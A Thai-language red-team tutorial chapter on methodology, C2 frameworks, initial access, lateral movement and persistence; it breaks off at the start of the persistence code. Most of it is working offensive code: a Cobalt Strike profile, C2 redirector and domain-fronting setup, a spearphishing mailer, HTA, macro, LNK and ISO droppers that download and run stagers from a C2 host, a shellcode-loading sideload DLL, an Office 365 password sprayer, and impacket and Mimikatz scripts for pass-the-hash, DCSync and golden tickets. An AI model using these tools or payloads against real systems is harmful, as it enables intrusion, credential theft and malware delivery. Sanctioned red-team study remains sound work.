# Part 86: Red Team Operations

## สารบัญ
1. [Red Team คืออะไร?](#1-red-team-คืออะไร)
2. [Red Team Methodology (TIBER-EU / CBEST)](#2-red-team-methodology)
3. [C2 Frameworks: Cobalt Strike, Havoc, Sliver](#3-c2-frameworks)
4. [Initial Access Techniques](#4-initial-access-techniques)
5. [Lateral Movement](#5-lateral-movement)
6. [Persistence Mechanisms](#6-persistence-mechanisms)
7. [Data Exfiltration](#7-data-exfiltration)
8. [OPSEC for Red Teamers](#8-opsec-for-red-teamers)
9. [Deconfliction & Coordination](#9-deconfliction--coordination)
10. [Red Team Reporting](#10-red-team-reporting)

---

## 1. Red Team คืออะไร?

Red Team คือทีมผู้เชี่ยวชาญด้านความปลอดภัยที่จำลองการโจมตีจากศัตรูจริง (Advanced Persistent Threat — APT) เพื่อทดสอบความพร้อมของ Blue Team และ SOC ขององค์กร ต่างจาก Penetration Testing ตรงที่:

| ลักษณะ | Penetration Test | Red Team Operation |
|---|---|---|
| ขอบเขต | กำหนดชัดเจน | ยืดหยุ่น เป็น Goal-Based |
| ระยะเวลา | 1–2 สัปดาห์ | 1–6 เดือน |
| เป้าหมาย | ค้นหาช่องโหว่ทุกตัว | บรรลุ Objective เฉพาะ |
| ความรู้ Blue Team | มักรู้ | ไม่รู้ (Blind) |
| Report | ช่องโหว่ครบถ้วน | Attack narrative + detection gaps |

### 1.1 Red Team Objectives ทั่วไป
```
- Crown Jewel Access:    เข้าถึงข้อมูลลับสำคัญ (IP, PII, Financial)
- Domain Domination:    บรรลุ Domain Admin / Enterprise Admin
- Persistence:          อยู่ในระบบได้นาน 30+ วัน โดยไม่ถูกตรวจพบ
- Lateral Reach:        เข้าถึง X% ของ internal hosts
- Data Exfil:           ส่งข้อมูลออกไปได้ N MB โดยไม่ถูก block
```

### 1.2 Red Team Roles
```
Red Team Lead       — วางแผน, ประสานงาน, รับผิดชอบ deconfliction
Operator            — ดำเนินการโจมตีจริง (phishing, exploitation)
C2 Operator         — บริหารจัดการ C2 infrastructure
Red Cell Analyst    — ค้นคว้า TTP ของ threat actor ที่จำลอง
Report Writer       — สรุปผลและเขียน deliverable
```

---

## 2. Red Team Methodology

### 2.1 TIBER-EU Framework
TIBER-EU (Threat Intelligence-Based Ethical Red-Teaming) เป็น framework ของ European Central Bank:

```
Phase 1: Preparation
  ├── Scope definition
  ├── Rules of Engagement (RoE)
  ├── White team setup
  └── Legal agreements

Phase 2: Threat Intelligence
  ├── Targeted Threat Intelligence (TTI) report
  ├── Identify realistic threat actors
  └── Generic Threat Landscape (GTL)

Phase 3: Red Team Test
  ├── Reconnaissance
  ├── Initial compromise
  ├── Establish foothold
  ├── Lateral movement
  ├── Escalate privileges
  └── Achieve objectives

Phase 4: Closure
  ├── Remediation report
  ├── Replay session
  └── Purple team exercise
```

### 2.2 MITRE ATT&CK Integration
Red Team ใช้ MITRE ATT&CK เป็น common language:

```python
#!/usr/bin/env python3
# red_team_planner.py — วางแผน TTP ตาม MITRE ATT&CK

import json
from dataclasses import dataclass, field
from typing import List, Dict
from datetime import datetime

@dataclass
class TTP:
    technique_id: str      # เช่น T1566.001
    name: str
    tactic: str
    description: str
    tool: str
    operator: str
    status: str = "planned"  # planned, in_progress, complete, failed
    notes: str = ""

@dataclass
class RedTeamOperation:
    name: str
    client: str
    start_date: str
    objective: str
    threat_actor: str      # APT group ที่จำลอง
    ttps: List[TTP] = field(default_factory=list)
    timeline: List[Dict] = field(default_factory=list)

    def add_ttp(self, ttp: TTP):
        self.ttps.append(ttp)
        self.log_event(f"TTP added: {ttp.technique_id} - {ttp.name}")

    def log_event(self, message: str):
        self.timeline.append({
            "timestamp": datetime.utcnow().isoformat(),
            "message": message
        })

    def get_mitre_navigator_layer(self) -> Dict:
        """สร้าง ATT&CK Navigator layer จาก TTPs"""
        techniques = []
        color_map = {
            "complete": "#ff6666",
            "in_progress": "#ffaa00",
            "planned": "#4488ff",
            "failed": "#888888"
        }
        for ttp in self.ttps:
            techniques.append({
                "techniqueID": ttp.technique_id,
                "color": color_map.get(ttp.status, "#cccccc"),
                "comment": ttp.notes,
                "enabled": True
            })
        return {
            "name": self.name,
            "versions": {"attack": "14", "navigator": "4.9"},
            "domain": "enterprise-attack",
            "techniques": techniques
        }

    def export_json(self, path: str):
        data = {
            "operation": {
                "name": self.name,
                "client": self.client,
                "objective": self.objective,
                "threat_actor": self.threat_actor
            },
            "ttps": [
                {
                    "id": t.technique_id,
                    "name": t.name,
                    "tactic": t.tactic,
                    "status": t.status,
                    "operator": t.operator
                } for t in self.ttps
            ],
            "timeline": self.timeline
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Operation log exported to {path}")


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    op = RedTeamOperation(
        name="Operation BlackSwan",
        client="ACME Corp",
        start_date="2024-01-15",
        objective="Access Crown Jewel Database (HR PII)",
        threat_actor="APT29 (Cozy Bear)"
    )

    op.add_ttp(TTP(
        technique_id="T1566.001",
        name="Spearphishing Attachment",
        tactic="Initial Access",
        description="ส่ง phishing email พร้อม malicious Excel macro",
        tool="GoPhish + custom macro",
        operator="operator1"
    ))
    op.add_ttp(TTP(
        technique_id="T1059.003",
        name="Windows Command Shell",
        tactic="Execution",
        description="Execute payload via cmd.exe",
        tool="Cobalt Strike",
        operator="operator1"
    ))
    op.add_ttp(TTP(
        technique_id="T1078",
        name="Valid Accounts",
        tactic="Persistence",
        description="ใช้ compromised credentials เพื่อ persistence",
        tool="mimikatz",
        operator="operator2"
    ))

    layer = op.get_mitre_navigator_layer()
    with open("navigator_layer.json", "w") as f:
        json.dump(layer, f, indent=2)

    op.export_json("operation_log.json")
    print(f"[+] Navigator layer saved")
```

---

## 3. C2 Frameworks

### 3.1 Cobalt Strike (Commercial)
Cobalt Strike เป็น C2 framework มาตรฐานอุตสาหกรรม ใช้ Beacon เป็น implant หลัก:

```bash
# เริ่ม Cobalt Strike Team Server
java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 \
  -jar cobaltstrike.jar <password> <profile.c2>

# เชื่อมต่อ Client
./cobaltstrike <teamserver_ip> <password>
```

**Malleable C2 Profile** — ปรับแต่ง Beacon traffic ให้ดูเหมือน legitimate traffic:
```
# amazon.profile — จำลอง Amazon AWS traffic
set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set dns_idle "8.8.8.8";
set dns_max_txt "252";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";
        metadata {
            base64url;
            parameter "x-amz-meta";
        }
    }
    server {
        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "Content-Type" "text/plain";
        output {
            base64url;
            prepend "200 OK";
            print;
        }
    }
}

http-post {
    set uri "/N4215/adj/amzn.us.sr.aps";
    client {
        header "Content-Type" "text/xml";
        id {
            parameter "sz";
        }
        output {
            base64url;
            parameter "sn";
        }
    }
    server {
        header "Content-Type" "text/html";
        output {
            base64url;
            prepend "<html>";
            append "</html>";
            print;
        }
    }
}
```

**Beacon Commands ที่ใช้บ่อย:**
```
beacon> sleep 60 20          # sleep 60s, 20% jitter
beacon> checkin               # force check-in ทันที
beacon> shell whoami          # รัน command ผ่าน cmd.exe
beacon> run whoami            # รัน command โดยตรง (ไม่มี cmd.exe)
beacon> powershell Get-Process # รัน PowerShell
beacon> execute-assembly /path/to/tool.exe  # run .NET assembly in-memory
beacon> shinject <pid> x64 shellcode.bin    # inject shellcode
beacon> spawn x64 <listener>               # spawn new beacon
beacon> steal_token <pid>    # steal process token
beacon> getsystem            # escalate to SYSTEM
beacon> hashdump             # dump SAM hashes
beacon> logonpasswords       # mimikatz
beacon> dcsync <domain>\<user>  # DC Sync attack
beacon> screenshot           # take screenshot
beacon> keylogger            # start keylogger
beacon> upload /path/file    # upload file
beacon> download C:\path\file  # download file
beacon> socks 1080           # start SOCKS4a proxy
beacon> rportfwd 8080 192.168.1.10 80  # reverse port forward
```

### 3.2 Havoc Framework (Open Source)
Havoc เป็น C2 framework open-source รุ่นใหม่ พัฒนาด้วย C++ และ Go:

```bash
# ติดตั้ง Havoc
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Build Teamserver
make ts-build

# Build Client
make client-build

# เริ่ม Teamserver
./havoc server --profile profiles/default.yaotl -v

# เชื่อมต่อ Client
./havoc client
```

**Havoc Profile (yaotl format):**
```
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-g++"
        Compiler86 = "/usr/bin/i686-w64-mingw32-g++"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    operator "operator1" {
        Password = "SecurePass123!"
    }
}

Listeners {
    Http {
        Name = "http-listener"
        Hosts = ["attacker.example.com"]
        HostBind = "0.0.0.0"
        Port = 443
        Ssl = true
        Secure = true

        Response {
            Headers {
                "Content-Type" = "text/html"
                "Server" = "Apache/2.4.54"
            }
        }
    }
}

Demon {
    Sleep = 10
    Jitter = 20
    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

### 3.3 Sliver (Open Source)
Sliver เป็น C2 framework จาก Bishop Fox ที่รองรับ mTLS, HTTP/S, DNS, WireGuard:

```bash
# ติดตั้ง Sliver
curl https://sliver.sh/install | sudo bash

# เริ่ม Sliver server
sliver-server

# ใน Sliver console
sliver > https                          # เริ่ม HTTPS listener
sliver > generate --http attacker.com --os windows --arch amd64 --save /tmp/
sliver > generate beacon --http attacker.com --seconds 60 --jitter 15

# เมื่อ implant connect กลับมา
sliver > sessions
sliver > use <session-id>
sliver (IMPLANT) > info
sliver (IMPLANT) > ps
sliver (IMPLANT) > ls C:\\
sliver (IMPLANT) > upload /local/file C:\\remote\\path
sliver (IMPLANT) > download C:\\sensitive.txt
sliver (IMPLANT) > shell          # interactive shell
sliver (IMPLANT) > execute-assembly --process notepad.exe Rubeus.exe kerberoast
sliver (IMPLANT) > socks5 start --host 127.0.0.1 --port 1080
sliver (IMPLANT) > portfwd add -r 192.168.1.10:445
```

### 3.4 C2 Infrastructure Setup
```python
#!/usr/bin/env python3
# c2_infra_builder.py — สร้าง C2 infrastructure แบบ resilient

import subprocess
import json
from pathlib import Path

class C2Infrastructure:
    """
    สร้าง C2 infrastructure แบบ layered:
    Operator → Redirector → Teamserver
    """

    def __init__(self, config: dict):
        self.config = config
        self.teamserver_ip = config["teamserver_ip"]
        self.redirectors = config["redirectors"]
        self.domain = config["domain"]

    def generate_redirector_nginx(self, redirector_ip: str) -> str:
        """สร้าง nginx config สำหรับ redirector"""
        return f"""
server {{
    listen 443 ssl;
    server_name {self.domain};

    ssl_certificate /etc/letsencrypt/live/{self.domain}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{self.domain}/privkey.pem;

    # อนุญาตเฉพาะ Beacon User-Agent
    if ($http_user_agent !~* "Mozilla/5.0") {{
        return 404;
    }}

    # ส่งต่อ traffic ที่ตรงกับ Beacon URIs
    location ~ ^/s/ref= {{
        proxy_pass https://{self.teamserver_ip};
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }}

    location ~ ^/N4215/ {{
        proxy_pass https://{self.teamserver_ip};
        proxy_ssl_verify off;
        proxy_set_header Host $host;
    }}

    # ส่ง traffic อื่นไปยัง decoy site
    location / {{
        proxy_pass https://www.amazon.com;
    }}
}}
"""

    def generate_iptables_rules(self) -> list:
        """สร้าง iptables rules เพื่อป้องกัน Teamserver"""
        rules = []
        # อนุญาตเฉพาะ redirectors เข้า Teamserver
        for r_ip in self.redirectors:
            rules.append(f"iptables -A INPUT -s {r_ip} -p tcp --dport 443 -j ACCEPT")
        rules.append("iptables -A INPUT -p tcp --dport 443 -j DROP")
        # อนุญาต operator เข้า Teamserver port
        for op_ip in self.config.get("operator_ips", []):
            rules.append(f"iptables -A INPUT -s {op_ip} -p tcp --dport 50050 -j ACCEPT")
        rules.append("iptables -A INPUT -p tcp --dport 50050 -j DROP")
        return rules

    def check_cdn_bypass(self) -> bool:
        """ตรวจสอบว่า CDN ไม่เปิดเผย Teamserver IP จริงหรือไม่"""
        import socket
        cdn_ip = socket.gethostbyname(self.domain)
        ts_ip = self.teamserver_ip
        if cdn_ip == ts_ip:
            print(f"[!] OPSEC WARNING: Domain resolves directly to Teamserver IP!")
            return False
        print(f"[+] CDN protecting Teamserver: {self.domain} -> {cdn_ip} (not {ts_ip})")
        return True

    def generate_domain_fronting_config(self) -> dict:
        """ตั้งค่า Domain Fronting ผ่าน CDN"""
        return {
            "front_domain": self.config.get("cdn_front_domain"),
            "actual_domain": self.domain,
            "headers": {
                "Host": self.domain,
                "X-Forwarded-Host": self.config.get("cdn_front_domain")
            },
            "note": "Host header = real C2 domain, SNI = fronted CDN domain"
        }


# ตัวอย่าง config
config = {
    "teamserver_ip": "10.0.0.100",
    "redirectors": ["1.2.3.4", "5.6.7.8"],
    "domain": "updates.legitimate-software.com",
    "operator_ips": ["203.0.113.10"],
    "cdn_front_domain": "allowed.azureedge.net"
}

infra = C2Infrastructure(config)
print(infra.generate_redirector_nginx("1.2.3.4"))
for rule in infra.generate_iptables_rules():
    print(rule)
print(json.dumps(infra.generate_domain_fronting_config(), indent=2))
```

---

## 4. Initial Access Techniques

### 4.1 Spearphishing Campaign
```python
#!/usr/bin/env python3
# phishing_campaign.py — จัดการ spearphishing campaign

import smtplib
import csv
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path
from jinja2 import Template
from dataclasses import dataclass
from typing import List
import time
import random

@dataclass
class Target:
    first_name: str
    last_name: str
    email: str
    title: str
    department: str
    company: str


class SpearphishingCampaign:
    """
    จัดการ spearphishing campaign แบบ targeted
    ใช้ SMTP relay ผ่าน legitimate mail provider
    """

    def __init__(self, smtp_server: str, smtp_port: int,
                 username: str, password: str):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.sent_log = []

    def load_targets(self, csv_path: str) -> List[Target]:
        targets = []
        with open(csv_path) as f:
            reader = csv.DictReader(f)
            for row in reader:
                targets.append(Target(**row))
        return targets

    def personalize_email(self, template: str, target: Target) -> str:
        """ปรับแต่ง email template สำหรับแต่ละ target"""
        t = Template(template)
        return t.render(
            first_name=target.first_name,
            last_name=target.last_name,
            title=target.title,
            department=target.department,
            company=target.company
        )

    def send_email(
        self,
        target: Target,
        from_name: str,
        from_email: str,
        subject_template: str,
        body_template: str,
        attachment_path: str = None,
        track_pixel: bool = True
    ) -> bool:
        """ส่ง spearphishing email พร้อม tracking pixel"""
        msg = MIMEMultipart("alternative")
        msg["From"] = f"{from_name} <{from_email}>"
        msg["To"] = target.email
        msg["Subject"] = self.personalize_email(subject_template, target)

        # เพิ่ม tracking pixel (1x1 transparent GIF)
        body_html = self.personalize_email(body_template, target)
        if track_pixel:
            tracker_url = f"https://track.{from_email.split('@')[1]}/open/{target.email}"
            body_html += f'<img src="{tracker_url}" width="1" height="1" />'

        msg.attach(MIMEText(body_html, "html"))

        if attachment_path and Path(attachment_path).exists():
            with open(attachment_path, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename={Path(attachment_path).name}"
            )
            msg.attach(part)

        try:
            with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port) as server:
                server.login(self.username, self.password)
                server.send_message(msg)
            self.sent_log.append({"target": target.email, "status": "sent"})
            print(f"[+] Sent to {target.email}")
            return True
        except Exception as e:
            self.sent_log.append({"target": target.email, "status": f"failed: {e}"})
            print(f"[-] Failed for {target.email}: {e}")
            return False

    def run_campaign(
        self,
        targets: List[Target],
        from_name: str,
        from_email: str,
        subject_template: str,
        body_template: str,
        attachment_path: str = None,
        delay_range: tuple = (60, 300)  # ส่ง email ทุก 1-5 นาที
    ):
        """รัน campaign ทั้งหมด พร้อม random delay"""
        print(f"[*] Starting campaign: {len(targets)} targets")
        for i, target in enumerate(targets):
            self.send_email(
                target, from_name, from_email,
                subject_template, body_template, attachment_path
            )
            if i < len(targets) - 1:
                delay = random.randint(*delay_range)
                print(f"    Waiting {delay}s before next email...")
                time.sleep(delay)
        print(f"[*] Campaign complete. Sent: {sum(1 for l in self.sent_log if l['status']=='sent')}")
```

### 4.2 Payload Generation
```python
#!/usr/bin/env python3
# payload_generator.py — สร้าง payload สำหรับ initial access

import subprocess
import base64
import os
from pathlib import Path

class PayloadGenerator:
    """
    สร้าง payload หลายรูปแบบสำหรับ initial access
    """

    def generate_hta_payload(self, c2_url: str, output: str) -> str:
        """สร้าง HTA (HTML Application) payload"""
        ps_command = f"""
$wc = New-Object System.Net.WebClient;
$wc.Headers.Add('User-Agent','Mozilla/5.0');
$data = $wc.DownloadData('{c2_url}/stage');
[System.Reflection.Assembly]::Load($data).EntryPoint.Invoke(0, @(,[string[]]@()));
"""
        encoded = base64.b64encode(ps_command.encode('utf-16-le')).decode()
        hta_content = f"""<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -enc {encoded}", 0, False
self.close
</script>"""
        with open(output, 'w') as f:
            f.write(hta_content)
        print(f"[+] HTA payload saved: {output}")
        return output

    def generate_macro_payload(self, c2_url: str) -> str:
        """สร้าง VBA macro สำหรับ Office document"""
        ps_template = f"""
Sub AutoOpen()
    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")
    Dim cmd As String
    cmd = "powershell -w hidden -nop -c " & _
          "IEX(New-Object Net.WebClient).DownloadString('{c2_url}/stager.ps1')"
    oShell.Run cmd, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub"""
        return ps_template

    def generate_lnk_payload(self, c2_url: str, output: str) -> str:
        """สร้าง LNK file ที่ download และรัน payload"""
        ps_command = f"IEX(New-Object Net.WebClient).DownloadString('{c2_url}/stager.ps1')"
        encoded = base64.b64encode(ps_command.encode('utf-16-le')).decode()

        # ใช้ PowerShell สร้าง LNK
        script = f"""
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('{output}')
$Shortcut.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
$Shortcut.Arguments = '-w hidden -nop -enc {encoded}'
$Shortcut.IconLocation = 'C:\\Windows\\System32\\shell32.dll,3'
$Shortcut.Save()
"""
        result = subprocess.run(
            ["powershell", "-Command", script],
            capture_output=True, text=True
        )
        return output

    def generate_dll_sideload(
        self, shellcode_path: str, output_dll: str,
        target_exe: str = "OneDriveSetup.exe"
    ) -> str:
        """สร้าง DLL สำหรับ DLL Sideloading"""
        c_template = f"""
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {{/* shellcode bytes here */}};

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        PVOID exec_mem = VirtualAlloc(
            NULL, sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (exec_mem) {{
            memcpy(exec_mem, shellcode, sizeof(shellcode));
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        }}
    }}
    return TRUE;
}}
"""
        with open(f"{output_dll}.c", 'w') as f:
            f.write(c_template)
        # Compile
        subprocess.run([
            "x86_64-w64-mingw32-gcc", "-shared", "-o", output_dll,
            f"{output_dll}.c", "-lkernel32"
        ])
        print(f"[+] DLL compiled: {output_dll}")
        return output_dll

    def generate_iso_dropper(self, payload_path: str, output_iso: str) -> str:
        """สร้าง ISO file ที่มี payload (bypass Mark of the Web)"""
        work_dir = "/tmp/iso_contents"
        os.makedirs(work_dir, exist_ok=True)
        # copy payload into iso working directory
        subprocess.run(["cp", payload_path, work_dir])
        # สร้าง ISO
        subprocess.run([
            "genisoimage", "-o", output_iso,
            "-J", "-r", work_dir
        ])
        print(f"[+] ISO created: {output_iso}")
        print("[!] Note: ISO bypasses Mark-of-the-Web — payload won't be flagged as downloaded")
        return output_iso
```

### 4.3 Valid Credentials Abuse
```python
#!/usr/bin/env python3
# cred_stuffing.py — ทดสอบ credential ที่ได้มาผ่าน password spray/OSINT

import requests
import json
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Tuple
import time

@dataclass
class Credential:
    username: str
    password: str
    domain: str = ""

class O365Sprayer:
    """
    Password spray ต่อ Office 365 — ระวัง: ต้องช้ามากเพื่อหลีกเลี่ยง lockout
    เว้นอย่างน้อย 30 นาทีต่อ attempt ต่อ user
    """
    ENDPOINT = "https://login.microsoft.com/common/oauth2/token"

    def __init__(self, tenant_domain: str):
        self.tenant = tenant_domain
        self.valid_creds = []

    def test_credential(self, username: str, password: str) -> Tuple[bool, str]:
        """ทดสอบ credential เดียว"""
        data = {
            "grant_type": "password",
            "username": username,
            "password": password,
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
            "resource": "https://graph.windows.net",
            "scope": "openid"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            resp = requests.post(self.ENDPOINT, data=data, headers=headers, timeout=10)
            result = resp.json()

            if "access_token" in result:
                return True, "Valid credentials!"
            elif result.get("error") == "AADSTS50053":
                return False, "Account locked"
            elif result.get("error") == "AADSTS50055":
                return False, "Password expired — valid user"
            elif result.get("error") == "AADSTS50126":
                return False, "Invalid credentials"
            elif result.get("error") == "AADSTS50076":
                return True, "Valid — MFA required"
            else:
                return False, result.get("error_description", "Unknown")
        except Exception as e:
            return False, str(e)

    def spray(
        self, usernames: List[str], passwords: List[str],
        delay_minutes: int = 30
    ):
        """Password spray แบบ slow-and-low"""
        print(f"[*] Starting O365 spray: {len(usernames)} users, {len(passwords)} passwords")
        print(f"[!] Delay between password rounds: {delay_minutes} minutes")

        for password in passwords:
            print(f"\n[*] Trying password: {password}")
            for username in usernames:
                success, msg = self.test_credential(username, password)
                if success:
                    print(f"[!] VALID: {username}:{password} — {msg}")
                    self.valid_creds.append(Credential(username, password, self.tenant))
                else:
                    print(f"    {username}: {msg}")
                time.sleep(1)  # 1 วินาทีต่อ user

            if password != passwords[-1]:  # ไม่ต้อง sleep หลัง password สุดท้าย
                print(f"[*] Waiting {delay_minutes} minutes before next password...")
                time.sleep(delay_minutes * 60)

        return self.valid_creds
```

---

## 5. Lateral Movement

### 5.1 Pass-the-Hash / Pass-the-Ticket
```python
#!/usr/bin/env python3
# lateral_movement.py — เทคนิค lateral movement ต่างๆ

import subprocess
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, NTDSHashes
from impacket.krb5.kerberosv5 import sendReceive
from impacket import version
from impacket.examples import logger
import sys

class LateralMovement:
    """
    เทคนิค Lateral Movement ต่างๆ ใช้ impacket
    """

    def __init__(self, domain: str, username: str,
                 password: str = None, hash_val: str = None):
        self.domain = domain
        self.username = username
        self.password = password or ""
        self.hash_val = hash_val or "aad3b435b51404eeaad3b435b51404ee:" + (hash_val or "")

    def smb_exec(self, target_ip: str, command: str) -> str:
        """รัน command ผ่าน SMB (PtH)"""
        from impacket.smbconnection import SMBConnection
        from impacket.examples.smbclient import MiniImpacketShell

        # ใช้ wmiexec/smbexec
        lm_hash = "" if ":" not in self.hash_val else self.hash_val.split(":")[0]
        nt_hash = "" if ":" not in self.hash_val else self.hash_val.split(":")[1]

        cmd = [
            "python3", "-m", "impacket.examples.wmiexec",
            f"{self.domain}/{self.username}@{target_ip}",
            "-hashes", self.hash_val,
            "-nooutput" if not command else command
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout

    def psexec(self, target_ip: str, command: str) -> str:
        """PSExec-style execution"""
        cmd = [
            "python3", "-m", "impacket.examples.psexec",
            f"{self.domain}/{self.username}@{target_ip}",
            "-hashes", self.hash_val, command
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout

    def dcom_exec(self, target_ip: str, command: str) -> str:
        """DCOM lateral movement"""
        cmd = [
            "python3", "-m", "impacket.examples.dcomexec",
            f"{self.domain}/{self.username}@{target_ip}",
            "-hashes", self.hash_val, command
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout

    def dump_hashes(self, target_ip: str) -> dict:
        """Dump hashes จาก remote SAM/NTDS"""
        cmd = [
            "python3", "-m", "impacket.examples.secretsdump",
            f"{self.domain}/{self.username}@{target_ip}",
            "-hashes", self.hash_val, "-just-dc-ntlm"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        hashes = {}
        for line in result.stdout.splitlines():
            if ":" in line and ":::" in line:
                parts = line.split(":")
                if len(parts) >= 4:
                    user = parts[0]
                    nt_hash = parts[3]
                    hashes[user] = nt_hash
        return hashes


class KerberosAttacks:
    """
    Kerberos-based attacks: Kerberoasting, AS-REP Roasting, Golden/Silver Ticket
    """

    def kerberoast(self, domain: str, username: str,
                   password: str, dc_ip: str) -> list:
        """Kerberoasting — ขอ TGS สำหรับ service accounts"""
        cmd = [
            "python3", "-m", "impacket.examples.GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-dc-ip", dc_ip, "-request"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        hashes = []
        for line in result.stdout.splitlines():
            if line.startswith("$krb5tgs$"):
                hashes.append(line.strip())
        print(f"[+] Got {len(hashes)} Kerberoastable TGS tickets")
        print("[*] Crack with: hashcat -m 13100 hashes.txt wordlist.txt")
        return hashes

    def asreproast(self, domain: str, usernames: list,
                   dc_ip: str) -> list:
        """AS-REP Roasting — ขอ AS-REP สำหรับ users ที่ไม่ต้องการ pre-auth"""
        hashes = []
        for username in usernames:
            cmd = [
                "python3", "-m", "impacket.examples.GetNPUsers",
                f"{domain}/{username}", "-no-pass",
                "-dc-ip", dc_ip, "-format", "hashcat"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.startswith("$krb5asrep$"):
                    hashes.append(line.strip())
                    print(f"[+] AS-REP hash for {username}")
        print("[*] Crack with: hashcat -m 18200 hashes.txt wordlist.txt")
        return hashes

    def golden_ticket(
        self, domain: str, domain_sid: str,
        krbtgt_hash: str, target_user: str = "Administrator"
    ) -> str:
        """สร้าง Golden Ticket จาก krbtgt hash"""
        cmd = [
            "python3", "-m", "impacket.examples.ticketer",
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            target_user
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        ticket_file = f"{target_user}.ccache"
        print(f"[+] Golden ticket saved: {ticket_file}")
        print(f"[*] Use with: export KRB5CCNAME={ticket_file}")
        return ticket_file

    def dcsync(self, domain: str, dc_ip: str,
               username: str, password: str) -> dict:
        """DC Sync attack — dump all domain hashes"""
        cmd = [
            "python3", "-m", "impacket.examples.secretsdump",
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-ntlm", "-outputfile", "dcsync_hashes"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        hashes = {}
        for line in result.stdout.splitlines():
            if ":::" in line:
                parts = line.split(":")
                if len(parts) >= 4:
                    hashes[parts[0]] = parts[3]
        return hashes
```

### 5.2 Living Off the Land (LOLBins)
```powershell
# ตัวอย่าง PowerShell lateral movement โดยใช้ built-in tools (LOLBins)
# ไม่ต้อง drop tools บน disk — ลดโอกาสถูกตรวจพบ

# WMI lateral movement
$wmi = [wmiclass]"\\\\target-host\\root\\cimv2:Win32_Process"
$result = $wmi.Create("cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt")
Write-Host "WMI process created: PID $($result.ProcessId)"

# Retrieve output
$smb_path = "\\\\target-host\\C$\\Windows\\Temp\\out.txt"
Get-Content $smb_path
Remove-Item $smb_path  # cleanup

# PowerShell Remoting (WinRM)
Enter-PSSession -ComputerName target-host -Credential $cred
Invoke-Command -ComputerName target-host -ScriptBlock { whoami; hostname } -Credential $cred

# DCOM lateral movement ผ่าน ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(
    [Guid]"9BA05972-F6A8-11CF-A442-00A0C90A8F39",
    "target-host"
))
$item = $com.Item()
$item.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\out.txt",
    "C:\\Windows\\System32", $null, 0
)

# Pass-the-Hash ผ่าน mimikatz (in memory)
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://c2/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp.local /ntlm:NT_HASH /run:powershell.exe"'

# Scheduled Task สำหรับ lateral movement
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-enc BASE64_PAYLOAD'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigger \
    -RunLevel Highest -Force
Start-ScheduledTask -TaskName 'WindowsUpdate'
Start-Sleep 15
Unregister-ScheduledTask -TaskName 'WindowsUpdate' -Confirm:$false
```

---

## 6. Persistence Mechanisms

### 6.1 Windows Persistence
```python
#!/usr/bin/env python3
# persistence.py — เทคนิค persistence ต่างๆ

import winreg  # Windows only
import os
import subprocess
from pathlib import Path

